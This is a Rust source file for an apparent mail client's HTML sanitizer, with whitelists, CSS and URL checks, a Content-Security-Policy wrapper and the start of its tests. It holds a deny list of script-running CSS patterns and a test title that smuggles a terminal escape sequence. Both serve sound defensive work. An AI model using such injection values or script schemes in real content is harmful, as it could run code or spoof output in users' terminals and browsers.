//! HTML made safe for a web view or a browser.
//!
//! The reader's own rendering ([`crate::html`]) is text and can do no harm.
//! This is for the faithful view: the message's HTML itself, in a web view
//! beside the reader or in the user's browser. Mail is whatever a stranger
//! sent, so what comes out of here can run nothing, submit nothing, and
//! load nothing from the network unless the user said it may.
//!
//! It is done in two passes, each of which would be enough for most of it:
//!
//! 1. `ammonia` parses the HTML the way a browser would and writes back
//!    only the elements and attributes on a list. Scripts, forms, frames,
//!    embedded objects, SVG and MathML are not on it, and neither is any
//!    attribute that handles an event.
//! 2. What `ammonia` wrote is plain, regular markup: every attribute
//!    quoted, every stray `<` escaped. That is read back tag by tag and
//!    each address and each piece of CSS is judged: links must be ones
//!    Quill would open, loads must be allowed, `cid:` images are pointed at
//!    their files. Anything the second pass cannot read is a reason to show
//!    nothing, not to guess.
//!
//! The result is wrapped in a document of Quill's own, whose
//! Content-Security-Policy says the same thing a third time.
//!
//! What happens to a `<style>` block: it is kept, with every `url(...)`
//! judged like any other load and every `@import` cut out, unless it holds
//! something there is no safe reading of (a backslash escape, a tag, an
//! `image-set`, or, with remote content off, a network address outside any
//! `url()`), in which case the whole block is dropped. The message then
//! looks plainer; it never loads what it should not. A `style` attribute
//! is judged the same way.

use std::collections::{HashMap, HashSet};

use crate::html::MAX_HTML_BYTES;
use crate::{clean, guard, links};

/// A message's HTML, sanitized.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Sanitized {
    /// A complete HTML document, safe to hand to a web view or a browser.
    pub html: String,
    /// How many remote loads were taken out. Zero when they were allowed.
    pub blocked: usize,
    /// The `cid:` content ids the document still refers to, in order of
    /// first use, without duplicates.
    pub inline: Vec<String>,
}

/// How to sanitize.
pub struct Options<'a> {
    /// Leave remote images and other remote loads in.
    pub remote: bool,
    /// For a `cid:` reference (the id without `cid:` or angle brackets),
    /// the name of the file beside the document that will hold that part,
    /// or `None` to drop the image.
    pub cid_file: &'a dyn Fn(&str) -> Option<String>,
    /// The document's title (a subject line). Untrusted: escape it.
    pub title: &'a str,
}

/// Shown in place of a message too large to sanitize.
pub const TOO_LARGE: &str = "This message is too large to show this way.";

/// Shown in place of a message whose HTML could not be made safe: nested
/// too deeply to parse in reasonable time, or not what the sanitizer
/// expected to be handed.
pub const CANNOT_SHOW: &str = "This message cannot be shown this way.";

/// The class on the text that stands in for a blocked image.
pub const BLOCKED_CLASS: &str = "quill-blocked";

/// Makes `html` safe to show.
///
/// Always removed: scripts and event handlers; forms and their controls;
/// frames and embedded objects; the message's own `<base>`, `<link>` and
/// `<meta>`; SVG and MathML; `@import`; and every address that is not a web
/// page, a mail address, an inline part or an embedded picture.
///
/// Removed unless `options.remote`: everything the page would fetch.
/// `blocked` counts those: the loads that allowing remote content would
/// bring back. An image taken out this way leaves its description behind.
pub fn sanitize(html: &str, options: &Options<'_>) -> Sanitized {
    if html.len() > MAX_HTML_BYTES {
        return notice(options, TOO_LARGE);
    }
    // Escape sequences mean nothing to a browser, and the page's source
    // may yet be looked at in a terminal.
    let html = clean::markup(html);
    let Some(scrubbed) = scrub(&html) else {
        return notice(options, CANNOT_SHOW);
    };
    let mut rewriter = Rewriter {
        options,
        blocked: 0,
        inline: Vec::new(),
        out: String::with_capacity(scrubbed.len() + 64),
    };
    if rewriter.run(&scrubbed).is_none() {
        return notice(options, CANNOT_SHOW);
    }
    Sanitized {
        html: document(options, &rewriter.out),
        blocked: rewriter.blocked,
        inline: rewriter.inline,
    }
}

/// The elements a message may use. Everything else is unwrapped: the
/// element goes and what it held stays.
const TAGS: &[&str] = &[
    "a",
    "abbr",
    "acronym",
    "address",
    "article",
    "aside",
    "audio",
    "b",
    "bdi",
    "bdo",
    "big",
    "blockquote",
    "br",
    "caption",
    "center",
    "cite",
    "code",
    "col",
    "colgroup",
    "dd",
    "del",
    "details",
    "dfn",
    "div",
    "dl",
    "dt",
    "em",
    "figcaption",
    "figure",
    "font",
    "footer",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "header",
    "hgroup",
    "hr",
    "i",
    "img",
    "ins",
    "kbd",
    "li",
    "main",
    "mark",
    "nav",
    "ol",
    "p",
    "picture",
    "pre",
    "q",
    "rp",
    "rt",
    "ruby",
    "s",
    "samp",
    "section",
    "small",
    "source",
    "span",
    "strike",
    "strong",
    "style",
    "sub",
    "summary",
    "sup",
    "table",
    "tbody",
    "td",
    "tfoot",
    "th",
    "thead",
    "time",
    "tr",
    "tt",
    "u",
    "ul",
    "var",
    "video",
    "wbr",
];

/// Elements removed with everything inside them: what they hold is code,
/// a control, or text never meant to be read on the page.
const DROPPED: &[&str] = &[
    "applet", "button", "canvas", "datalist", "frameset", "iframe", "math", "noembed", "noframes",
    "noscript", "object", "script", "select", "svg", "template", "textarea", "title",
];

/// Attributes kept exactly as written. None of them can load or run
/// anything.
const PLAIN_ATTRIBUTES: &[&str] = &[
    "abbr",
    "align",
    "alt",
    "aria-hidden",
    "aria-label",
    "bgcolor",
    "border",
    "cellpadding",
    "cellspacing",
    "class",
    "color",
    "colspan",
    "controls",
    "datetime",
    "dir",
    "face",
    "headers",
    "height",
    "hspace",
    "id",
    "lang",
    "media",
    "nowrap",
    "open",
    "role",
    "rowspan",
    "scope",
    "size",
    "sizes",
    "span",
    "start",
    "summary",
    "title",
    "type",
    "valign",
    "vspace",
    "width",
];

/// Attributes that are judged before they are kept: a link, the ways an
/// element loads something, and inline CSS.
const JUDGED_ATTRIBUTES: &[&str] = &["background", "href", "poster", "src", "srcset", "style"];

/// CSS that is refused outright when it is still there once every `url()`
/// has been dealt with: other ways to load, and ways to run.
const FORBIDDEN_CSS: &[&str] = &[
    "@import",
    "expression(",
    "javascript:",
    "vbscript:",
    "image-set(",
    "image(",
    "src(",
    "-moz-binding",
];

/// What an address on the network looks like in CSS, wherever it stands.
const REMOTE_CSS: &[&str] = &["http:", "https:", "//"];

/// Pictures a `data:` address may hold. SVG is not one: it is a document,
/// not a picture.
const DATA_IMAGES: &[&str] = &[
    "avif", "bmp", "gif", "heic", "heif", "jpeg", "jpg", "png", "tiff", "webp", "x-icon",
];

/// The first pass: `html` with only listed elements and attributes left,
/// written out as regular markup. `None` if it could not be parsed and
/// written in reasonable time, or grew out of all proportion on the way.
fn scrub(html: &str) -> Option<String> {
    let attributes: HashSet<&str> = PLAIN_ATTRIBUTES
        .iter()
        .chain(JUDGED_ATTRIBUTES)
        .copied()
        .collect();
    let mut builder = ammonia::Builder::empty();
    builder
        .tags(TAGS.iter().copied().collect())
        .clean_content_tags(DROPPED.iter().copied().collect())
        .generic_attributes(attributes)
        .tag_attributes(HashMap::new())
        // Narrowed again, attribute by attribute, in the second pass.
        .url_schemes(["http", "https", "mailto", "cid", "data"].into())
        .url_relative(ammonia::UrlRelative::PassThrough)
        // Added by the second pass, to the links that survive it.
        .link_rel(None)
        .strip_comments(true);
    let document = builder.clean_from_reader(guard::Source::new(html)).ok()?;
    // Written out against the clock and a limit on size, like the parse.
    let mut written = guard::Sink::new(html.len());
    document.write_to(&mut written).ok()?;
    written.into_string()
}

/// The second pass.
struct Rewriter<'a, 'o> {
    options: &'a Options<'o>,
    blocked: usize,
    inline: Vec<String>,
    out: String,
}

/// A start tag as the first pass wrote it.
struct Tag<'a> {
    name: &'a str,
    attributes: Vec<(&'a str, String)>,
}

impl Tag<'_> {
    fn attribute(&self, name: &str) -> Option<&str> {
        self.attributes
            .iter()
            .find(|(known, _)| *known == name)
            .map(|(_, value)| value.as_str())
    }
}

/// What an address in a loading attribute or a `url()` is.
enum Load {
    /// A part of the message, by content id.
    Inline(String),
    /// A `data:` address.
    Data(String),
    /// Somewhere on the network.
    Remote(String),
    /// Anything else: a file, a script, a relative path. Never kept.
    Other,
}

/// What became of one `url()` in a piece of CSS.
enum CssUrl {
    Keep(String),
    Inline { id: String, file: String },
    Blocked,
    Drop,
}

impl Rewriter<'_, '_> {
    /// Reads the first pass's markup and writes the body of the document.
    /// `None` if the markup is not what the first pass is known to write.
    fn run(&mut self, html: &str) -> Option<()> {
        let mut rest = html;
        loop {
            let Some(at) = rest.find('<') else {
                self.text(rest);
                return Some(());
            };
            self.text(&rest[..at]);
            rest = &rest[at + 1..];

            if let Some(after) = rest.strip_prefix('/') {
                let end = after.find('>')?;
                let name = &after[..end];
                if !TAGS.contains(&name) {
                    return None;
                }
                self.out.push_str("</");
                self.out.push_str(name);
                self.out.push('>');
                rest = &after[end + 1..];
                continue;
            }

            let (tag, after) = start_tag(rest)?;
            rest = after;
            if tag.name == "style" {
                // The one element whose content is not escaped. It runs to
                // its end tag, which the parser guarantees is the first.
                let end = rest.find("</style>")?;
                self.style_block(&tag, &rest[..end]);
                rest = &rest[end + "</style>".len()..];
            } else {
                self.element(&tag);
            }
        }
    }

    /// Text between tags, already escaped by the first pass.
    fn text(&mut self, text: &str) {
        self.out.push_str(&clean::drop_controls(text));
    }

    fn element(&mut self, tag: &Tag<'_>) {
        let mut kept: Vec<(&str, String)> = Vec::with_capacity(tag.attributes.len() + 1);
        // Whether a load was taken out that allowing remote content would
        // have kept. Counted once for the element, however many of its
        // attributes named the same picture.
        let mut blocked = false;
        for (name, value) in &tag.attributes {
            let value = clean::drop_controls(value);
            let judged = match *name {
                "href" => Some(value.trim())
                    .filter(|url| tag.name == "a" && links::is_openable(url))
                    .map(str::to_owned),
                "src" => match tag.name {
                    "img" => self.load(&value, true, &mut blocked),
                    "audio" | "source" | "video" => self.load(&value, false, &mut blocked),
                    _ => None,
                },
                "poster" if tag.name == "video" => self.load(&value, false, &mut blocked),
                "background" => self.load(&value, false, &mut blocked),
                "srcset" if matches!(tag.name, "img" | "source") => {
                    self.source_set(&value, &mut blocked)
                }
                "style" => self.css(&value, false),
                name if PLAIN_ATTRIBUTES.contains(&name) => Some(value.into_owned()),
                _ => None,
            };
            if let Some(value) = judged {
                kept.push((name, value));
            }
        }
        if blocked {
            self.blocked += 1;
        }

        let has = |name: &str| kept.iter().any(|(known, _)| *known == name);
        match tag.name {
            "a" if has("href") => kept.push(("rel", "noopener noreferrer".to_owned())),
            "img" if !has("src") && !has("srcset") => {
                // A picture with nothing left to show. One that was blocked
                // leaves its description, so the reader knows what is
                // missing; a spacer or a tracking pixel has none and
                // leaves nothing.
                let alt = tag.attribute("alt").unwrap_or_default().trim();
                if blocked && !alt.is_empty() {
                    self.out.push_str("<span class=\"");
                    self.out.push_str(BLOCKED_CLASS);
                    self.out.push_str("\">");
                    self.out
                        .push_str(&escape(&clean::drop_controls(alt), false));
                    self.out.push_str("</span>");
                }
                return;
            }
            "source" if !has("src") && !has("srcset") => return,
            _ => {}
        }
        self.open(tag.name, &kept);
    }

    fn open(&mut self, name: &str, attributes: &[(&str, String)]) {
        self.out.push('<');
        self.out.push_str(name);
        for (name, value) in attributes {
            self.out.push(' ');
            self.out.push_str(name);
            self.out.push_str("=\"");
            self.out.push_str(&escape(value, true));
            self.out.push('"');
        }
        self.out.push('>');
    }

    /// A `<style>` block: kept if its CSS has a safe reading.
    fn style_block(&mut self, tag: &Tag<'_>, css: &str) {
        let is_css = tag
            .attribute("type")
            .is_none_or(|kind| kind.trim().eq_ignore_ascii_case("text/css"));
        if !is_css {
            return;
        }
        let Some(css) = self.css(css, true) else {
            return;
        };
        let media: Vec<(&str, String)> = tag
            .attribute("media")
            .map(|media| ("media", clean::drop_controls(media).into_owned()))
            .into_iter()
            .collect();
        self.open("style", &media);
        self.out.push_str(&css);
        self.out.push_str("</style>");
    }

    /// Judges an address an element would load. `picture` says whether an
    /// embedded picture is acceptable here, which it is in an image's
    /// `src` and nowhere else.
    fn load(&mut self, value: &str, picture: bool, blocked: &mut bool) -> Option<String> {
        match classify(value) {
            Load::Inline(id) => {
                let (id, file) = self.inline_file(&id)?;
                self.refer(id);
                Some(file)
            }
            Load::Data(url) => (picture && is_picture(&url)).then_some(url),
            Load::Remote(url) if self.options.remote => Some(url),
            Load::Remote(_) => {
                *blocked = true;
                None
            }
            Load::Other => None,
        }
    }

    /// Judges a `srcset`: kept only when every picture in it is remote and
    /// remote content is allowed. Its other uses have a `src` to fall back
    /// on.
    fn source_set(&mut self, value: &str, blocked: &mut bool) -> Option<String> {
        let mut any = false;
        for candidate in value.split(',') {
            let Some(url) = candidate.split_ascii_whitespace().next() else {
                continue;
            };
            if !matches!(classify(url), Load::Remote(_)) {
                return None;
            }
            any = true;
        }
        if !any {
            return None;
        }
        if self.options.remote {
            return Some(value.to_owned());
        }
        *blocked = true;
        None
    }

    /// The id a `cid:` address names, as [`Options::cid_file`] is asked
    /// about it, and the relative address of the file it gave.
    fn inline_file(&self, reference: &str) -> Option<(String, String)> {
        let id = percent_decode(reference);
        let id = clean::header(&id);
        let id = id.trim().trim_matches(|c| c == '<' || c == '>').trim();
        if id.is_empty() {
            return None;
        }
        let file = (self.options.cid_file)(id)?;
        // A name is a name: it does not get to climb out of the folder.
        if file.is_empty() || file == "." || file == ".." {
            return None;
        }
        Some((id.to_owned(), format!("./{}", percent_encode(&file))))
    }

    /// Notes that the document refers to the part `id`.
    fn refer(&mut self, id: String) {
        if !self.inline.contains(&id) {
            self.inline.push(id);
        }
    }

    /// Judges a piece of CSS: a `style` attribute, or a whole block. `None`
    /// when it is dropped.
    fn css(&mut self, source: &str, block: bool) -> Option<String> {
        // An escape can spell anything, `url` included, and nothing a
        // message needs is lost with it.
        if source.contains('\\') {
            return None;
        }
        let mut text = clean::drop_controls(source).into_owned();
        if block {
            // Old mail wraps its CSS in a comment for programs that did
            // not know the element. Nothing else in CSS needs a `<`, and
            // without one the block cannot end early or open a tag.
            text = text.replace("<!--", "").replace("-->", "");
            if text.contains('<') {
                return None;
            }
        }
        let text = without_imports(&without_comments(&text));
        let lower = text.to_ascii_lowercase();

        let mut out = String::with_capacity(text.len());
        // The CSS in lower case with its `url()`s taken out: what is left
        // to check for other ways of loading.
        let mut residue = String::with_capacity(text.len());
        let mut inline: Vec<String> = Vec::new();
        let mut blocked = 0;
        let mut at = 0;
        while let Some(found) = lower[at..].find("url(") {
            let start = at + found;
            let inside = start + "url(".len();
            out.push_str(&text[at..start]);
            residue.push_str(&lower[at..start]);
            residue.push(' ');
            let (address, length) = css_url(&text[inside..])?;
            match self.css_load(address) {
                CssUrl::Keep(url) => {
                    out.push_str("url(\"");
                    out.push_str(&url);
                    out.push_str("\")");
                }
                CssUrl::Inline { id, file } => {
                    out.push_str("url(\"");
                    out.push_str(&file);
                    out.push_str("\")");
                    inline.push(id);
                }
                CssUrl::Blocked => {
                    out.push_str("none");
                    blocked += 1;
                }
                CssUrl::Drop => out.push_str("none"),
            }
            at = inside + length;
        }
        out.push_str(&text[at..]);
        residue.push_str(&lower[at..]);
        if FORBIDDEN_CSS.iter().any(|bad| residue.contains(bad)) {
            return None;
        }
        // With remote content off, CSS that still names somewhere on the
        // network once its `url()`s are dealt with is not given the chance
        // to mean it.
        if !self.options.remote && REMOTE_CSS.iter().any(|sign| residue.contains(sign)) {
            return None;
        }
        if out.trim().is_empty() {
            return None;
        }
        // Counted only now that the CSS is known to be kept.
        self.blocked += blocked;
        for id in inline {
            self.refer(id);
        }
        Some(out)
    }

    fn css_load(&self, address: &str) -> CssUrl {
        // Inside `url("...")` a quote or a bracket would end the address
        // early, so one that holds either is not kept.
        let is_plain = |url: &str| !url.contains(['"', '\'', '(', ')', '<', '>']);
        match classify(address) {
            Load::Inline(id) => match self.inline_file(&id) {
                Some((id, file)) => CssUrl::Inline { id, file },
                None => CssUrl::Drop,
            },
            Load::Remote(url) if self.options.remote && is_plain(&url) => CssUrl::Keep(url),
            Load::Remote(_) if !self.options.remote => CssUrl::Blocked,
            _ => CssUrl::Drop,
        }
    }
}

/// Reads a start tag as the first pass writes one: a name, then attributes
/// each as ` name="value"`, then `>`. `input` starts after the `<`. Returns
/// the tag and what follows it. `None` for anything else, and for any
/// element or attribute the first pass was not told to keep.
fn start_tag(input: &str) -> Option<(Tag<'_>, &str)> {
    let (tag, rest) = read_tag(input)?;
    let expected = TAGS.contains(&tag.name)
        && tag
            .attributes
            .iter()
            .all(|(name, _)| PLAIN_ATTRIBUTES.contains(name) || JUDGED_ATTRIBUTES.contains(name));
    expected.then_some((tag, rest))
}

/// Reads the regular form of a start tag, whatever its names are.
fn read_tag(input: &str) -> Option<(Tag<'_>, &str)> {
    let length = input
        .bytes()
        .take_while(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit())
        .count();
    let (name, mut rest) = input.split_at(length);
    if name.is_empty() {
        return None;
    }
    let mut attributes = Vec::new();
    loop {
        if let Some(after) = rest.strip_prefix('>') {
            return Some((Tag { name, attributes }, after));
        }
        rest = rest.strip_prefix(' ')?;
        let length = rest
            .bytes()
            .take_while(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || *byte == b'-')
            .count();
        let (attribute, after) = rest.split_at(length);
        if attribute.is_empty() {
            return None;
        }
        let after = after.strip_prefix("=\"")?;
        let end = after.find('"')?;
        attributes.push((attribute, unescape(&after[..end])));
        rest = &after[end + 1..];
    }
}

/// An attribute's value as the first pass escaped it, read back.
fn unescape(value: &str) -> String {
    if !value.contains('&') {
        return value.to_owned();
    }
    let mut plain = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(at) = rest.find('&') {
        plain.push_str(&rest[..at]);
        rest = &rest[at..];
        let known = [
            ("&amp;", '&'),
            ("&lt;", '<'),
            ("&gt;", '>'),
            ("&quot;", '"'),
            ("&nbsp;", '\u{a0}'),
        ]
        .into_iter()
        .find(|(entity, _)| rest.starts_with(entity));
        match known {
            Some((entity, c)) => {
                plain.push(c);
                rest = &rest[entity.len()..];
            }
            None => {
                plain.push('&');
                rest = &rest[1..];
            }
        }
    }
    plain.push_str(rest);
    plain
}

/// `text` escaped for the document: as an attribute's value, or as text.
fn escape(text: &str, attribute: bool) -> String {
    let mut escaped = String::with_capacity(text.len());
    for c in text.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' if attribute => escaped.push_str("&quot;"),
            c => escaped.push(c),
        }
    }
    escaped
}

/// Reads an address the way a browser does before deciding what it is:
/// tabs and line breaks anywhere in it are ignored, and so are spaces and
/// control characters around it.
fn classify(value: &str) -> Load {
    let url: String = value
        .trim_matches(|c: char| c <= ' ')
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect();
    let lower = url.to_ascii_lowercase();
    if lower.starts_with("cid:") {
        return Load::Inline(url["cid:".len()..].to_owned());
    }
    if lower.starts_with("data:") {
        return Load::Data(url);
    }
    // A real address is printable ASCII once written out. Anything else is
    // not given the benefit of the doubt.
    if !url.bytes().all(|byte| byte.is_ascii_graphic()) {
        return Load::Other;
    }
    if lower.starts_with("https://") || lower.starts_with("http://") {
        return Load::Remote(url);
    }
    if lower.starts_with("//") && url.len() > 2 {
        // Relative to a page that was itself fetched. This one was not.
        return Load::Remote(format!("https:{url}"));
    }
    Load::Other
}

/// Whether a `data:` address is one of the pictures a page may embed.
fn is_picture(url: &str) -> bool {
    let lower = url.to_ascii_lowercase();
    let Some(kind) = lower.strip_prefix("data:image/") else {
        return false;
    };
    let subtype = kind.split([';', ',']).next().unwrap_or_default();
    kind.len() > subtype.len()
        && DATA_IMAGES.contains(&subtype)
        && url.bytes().all(|byte| byte.is_ascii_graphic())
}

/// Reads the inside of a `url(`: the address, and how many bytes there are
/// up to and including the closing bracket. `None` if it never closes.
fn css_url(after: &str) -> Option<(&str, usize)> {
    let inner = after.trim_start();
    let lead = after.len() - inner.len();
    match inner.chars().next() {
        Some(quote @ ('"' | '\'')) => {
            let body = &inner[1..];
            let close = body.find(quote)?;
            let tail = &body[close + 1..];
            let gap = tail.len() - tail.trim_start().len();
            tail[gap..]
                .starts_with(')')
                .then_some((&body[..close], lead + 1 + close + 1 + gap + 1))
        }
        _ => {
            let close = inner.find(')')?;
            Some((inner[..close].trim(), lead + close + 1))
        }
    }
}

/// CSS without its comments. One that never closes takes the rest with it,
/// as it would in a browser. What stood either side of a comment is joined
/// up, so that a word split by one is judged as the word it could be.
fn without_comments(css: &str) -> String {
    let mut kept = String::with_capacity(css.len());
    let mut rest = css;
    while let Some(start) = rest.find("/*") {
        kept.push_str(&rest[..start]);
        rest = match rest[start + 2..].find("*/") {
            Some(end) => &rest[start + 2 + end + 2..],
            None => "",
        };
    }
    kept.push_str(rest);
    kept
}

/// CSS without its `@import` rules: each is cut from the `@` to the `;`
/// that ends it. No style sheet is fetched for a message, allowed remote
/// content or not.
fn without_imports(css: &str) -> String {
    let lower = css.to_ascii_lowercase();
    let mut kept = String::with_capacity(css.len());
    let mut at = 0;
    while let Some(found) = lower[at..].find("@import") {
        let start = at + found;
        kept.push_str(&css[at..start]);
        at = match lower[start..].find(';') {
            Some(end) => start + end + 1,
            None => css.len(),
        };
    }
    kept.push_str(&css[at..]);
    kept
}

/// A `cid:` address is a content id with the characters an address cannot
/// hold written as `%XX`. This reads it back. What does not decode to text
/// is left as it was.
fn percent_decode(text: &str) -> String {
    if !text.contains('%') {
        return text.to_owned();
    }
    let bytes = text.as_bytes();
    let mut decoded = Vec::with_capacity(bytes.len());
    let mut at = 0;
    while at < bytes.len() {
        let hex = |byte: Option<&u8>| byte.and_then(|byte| char::from(*byte).to_digit(16));
        match (bytes[at], hex(bytes.get(at + 1)), hex(bytes.get(at + 2))) {
            (b'%', Some(high), Some(low)) => {
                // Two hex digits are at most 255.
                decoded.push(u8::try_from(high * 16 + low).unwrap_or(b'?'));
                at += 3;
            }
            (byte, _, _) => {
                decoded.push(byte);
                at += 1;
            }
        }
    }
    String::from_utf8(decoded).unwrap_or_else(|_| text.to_owned())
}

/// A file name as one segment of a relative address.
fn percent_encode(name: &str) -> String {
    let mut encoded = String::with_capacity(name.len());
    for byte in name.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-' | b'~') {
            encoded.push(char::from(byte));
        } else {
            encoded.push_str(&format!("%{byte:02X}"));
        }
    }
    encoded
}

/// What the page may do, whatever the sanitizer missed: run nothing, send
/// nothing, and load only pictures embedded in it or lying beside it.
const POLICY: &str = "default-src 'none'; img-src data: 'self'; media-src 'self'; \
                      style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'";

/// The same with remote content allowed: pictures, media and fonts may
/// come from the web. Still no scripts, no frames, no forms, and no style
/// sheets from elsewhere.
const POLICY_REMOTE: &str = "default-src 'none'; img-src data: 'self' https: http:; \
                             media-src 'self' https: http:; font-src https: http:; \
                             style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'";

/// Quill's own styling, before the message's: the system font, a readable
/// measure, light or dark with the system, and nothing wider than the pane.
const BASE_STYLE: &str = ":root{color-scheme:light dark}\
body{margin:0 auto;padding:16px;max-width:52em;\
font:15px/1.5 -apple-system,system-ui,sans-serif;overflow-wrap:break-word}\
img,video{max-width:100%;height:auto}\
table{max-width:100%}\
pre{white-space:pre-wrap}\
blockquote{margin:0 0 0 .5em;padding-left:1em;border-left:2px solid #8886}\
.quill-blocked{border:1px dashed #8888;border-radius:3px;padding:0 .3em;\
font-size:.9em;opacity:.8}\
.quill-notice{opacity:.8}";

/// The whole document around a sanitized body.
fn document(options: &Options<'_>, body: &str) -> String {
    let policy = if options.remote {
        POLICY_REMOTE
    } else {
        POLICY
    };
    let title = clean::header(options.title);
    let title = escape(title.trim(), false);
    format!(
        "<!doctype html>\n<html><head>\n<meta charset=\"utf-8\">\n\
         <meta http-equiv=\"Content-Security-Policy\" content=\"{policy}\">\n\
         <meta name=\"referrer\" content=\"no-referrer\">\n\
         <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\
         <title>{title}</title>\n<style>{BASE_STYLE}</style>\n</head><body>\n{body}\n</body></html>\n"
    )
}

/// A document that says why the message is not shown.
fn notice(options: &Options<'_>, text: &str) -> Sanitized {
    Sanitized {
        html: document(options, &format!("<p class=\"quill-notice\">{text}</p>")),
        blocked: 0,
        inline: Vec::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn no_parts(_: &str) -> Option<String> {
        None
    }

    fn options(remote: bool) -> Options<'static> {
        Options {
            remote,
            cid_file: &no_parts,
            title: "A message",
        }
    }

    /// The sanitized body, without the document around it.
    fn body_of(html: &str) -> &str {
        let (_, rest) = html.split_once("<body>\n").expect("a body");
        let (body, _) = rest.rsplit_once("\n</body>").expect("the end of the body");
        body
    }

    fn body(html: &str) -> String {
        body_of(&sanitize(html, &options(false)).html).to_owned()
    }

    fn body_with_remote(html: &str) -> String {
        body_of(&sanitize(html, &options(true)).html).to_owned()
    }

    /// A start tag found in sanitized markup: its name and its attributes.
    type Found = (String, Vec<(String, String)>);

    /// Every start tag in a piece of sanitized markup, with its attributes,
    /// and the content of every style block.
    fn tags(markup: &str) -> (Vec<Found>, Vec<String>) {
        let mut found = Vec::new();
        let mut styles = Vec::new();
        let mut rest = markup;
        while let Some(at) = rest.find('<') {
            rest = &rest[at + 1..];
            if rest.starts_with('/') {
                continue;
            }
            let (tag, after) = read_tag(rest).unwrap_or_else(|| panic!("a tag at {rest:?}"));
            rest = after;
            if tag.name == "style" {
                let (css, after) = rest.split_once("</style>").expect("the end of the style");
                styles.push(css.to_owned());
                rest = after;
            }
            found.push((
                tag.name.to_owned(),
                tag.attributes
                    .into_iter()
                    .map(|(name, value)| (name.to_owned(), value))
                    .collect(),
            ));
        }
        (found, styles)
    }

    /// Everything a sanitized document promises, checked tag by tag.
    fn assert_safe(document: &str, remote: bool) {
        let lower = document.to_ascii_lowercase();
        assert!(!lower.contains("<script"), "{document}");
        assert!(
            !document.contains(|c: char| clean::is_control(c) && c != '\n' && c != '\t'),
            "{document:?}"
        );
        let (found, styles) = tags(body_of(document));
        let squeeze = |text: &str| -> String {
            text.chars()
                .filter(|c| !c.is_whitespace() && !clean::is_control(*c))
                .collect::<String>()
                .to_ascii_lowercase()
        };
        let is_local = |css: &str| {
            let css = squeeze(css);
            !css.contains("http:") && !css.contains("https:") && !css.contains("//")
        };
        for (name, attributes) in &found {
            assert!(TAGS.contains(&name.as_str()), "<{name}> in {document}");
            for (attribute, value) in attributes {
                assert!(!attribute.starts_with("on"), "{attribute} in {document}");
                let squeezed = squeeze(value);
                assert!(!squeezed.contains("javascript:"), "{value:?}");
                assert!(!squeezed.contains("vbscript:"), "{value:?}");
                match attribute.as_str() {
                    "href" => {
                        assert_eq!(name, "a");
                        assert!(links::is_openable(value), "{value:?}");
                        assert!(
                            attributes
                                .contains(&("rel".to_owned(), "noopener noreferrer".to_owned())),
                            "{document}"
                        );
                    }
                    "src" | "poster" | "background" => {
                        let embedded = value.starts_with("./")
                            || (name == "img" && attribute == "src" && is_picture(value));
                        let fetched =
                            squeezed.starts_with("https://") || squeezed.starts_with("http://");
                        assert!(embedded || (remote && fetched), "{attribute}={value:?}");
                    }
                    "srcset" => assert!(remote, "{value:?}"),
                    "style" => {
                        assert!(!squeezed.contains("@import") && !squeezed.contains("expression("));
                        assert!(!value.contains('\\'));
                        assert!(remote || is_local(value), "{value:?}");
                    }
                    "rel" => assert_eq!(value, "noopener noreferrer"),
                    other => assert!(PLAIN_ATTRIBUTES.contains(&other), "{other}"),
                }
            }
        }
        for css in &styles {
            let squeezed = squeeze(css);
            assert!(!css.contains(['<', '\\']), "{css:?}");
            assert!(!squeezed.contains("@import") && !squeezed.contains("expression("));
            assert!(remote || is_local(css), "{css:?}");
        }
    }

    #[test]
    fn ordinary_markup_comes_through() {
        assert_eq!(
            body(
                "<h1>Offsite</h1><p style=\"color: #333\">The <b>agenda</b> is \
                 <em class=\"note\">nearly</em> done.</p>\
                 <table width=\"600\" cellpadding=\"0\" bgcolor=\"#ffffff\"><tr><td align=\"center\">Train</td></tr></table>\
                 <ul><li>Travel</li></ul><blockquote>Can we move it?</blockquote>"
            ),
            "<h1>Offsite</h1><p style=\"color: #333\">The <b>agenda</b> is \
             <em class=\"note\">nearly</em> done.</p>\
             <table width=\"600\" cellpadding=\"0\" bgcolor=\"#ffffff\"><tbody><tr><td align=\"center\">Train</td></tr></tbody></table>\
             <ul><li>Travel</li></ul><blockquote>Can we move it?</blockquote>"
        );
    }

    #[test]
    fn it_is_a_whole_document_with_a_policy_of_ours() {
        let options = Options {
            remote: false,
            cid_file: &no_parts,
            title: "Q4 <roadmap> & \u{1b}]0;pwned\u{7}plans\u{202e}",
        };
        let html = sanitize("<p>Hello.</p>", &options).html;
        assert!(html.starts_with("<!doctype html>\n<html><head>\n<meta charset=\"utf-8\">\n"));
        assert!(html.contains("<title>Q4 &lt;roadmap&gt; &amp; plans</title>"));
        assert!(html.contains("color-scheme:light dark"));
        assert!(html.contains("font:15px/1.5 -apple-system"));
        assert!(html.contains("max-width:52em"));
        assert!(html.ends_with("<body>\n<p>Hello.</p>\n</body></html>\n"));

        let policy = |html: &str| -> String {
            let (_, rest) = html
                .split_once("http-equiv=\"Content-Security-Policy\" content=\"")
                .expect("a policy");
            rest.split('"').next().unwrap_or_default().to_owned()
        };
        let closed = policy(&html);
        assert!(closed.starts_with("default-src 'none';"));
        assert!(closed.contains("img-src data: 'self';"));
        assert!(closed.contains("style-src 'unsafe-inline';"));
        // No scripts, and nothing from the network.
        assert!(!closed.contains("script") && !closed.contains("http"));

        let open = policy(&sanitize("<p>Hello.</p>", &self::options(true)).html);
        assert!(open.starts_with("default-src 'none';"));
        assert!(open.contains("img-src data: 'self' https: http:;"));
        assert!(open.contains("media-src 'self' https: http:;"));
        assert!(open.contains("font-src https: http:;"));
        assert!(!open.contains("script"));
        // Exactly one policy, and it comes before anything of the message's.
        assert_eq!(html.matches("Content-Security-Policy").count(), 1);
    }

    #[test]
    fn scripts_and_handlers_are_removed() {
        assert_eq!(
            body(
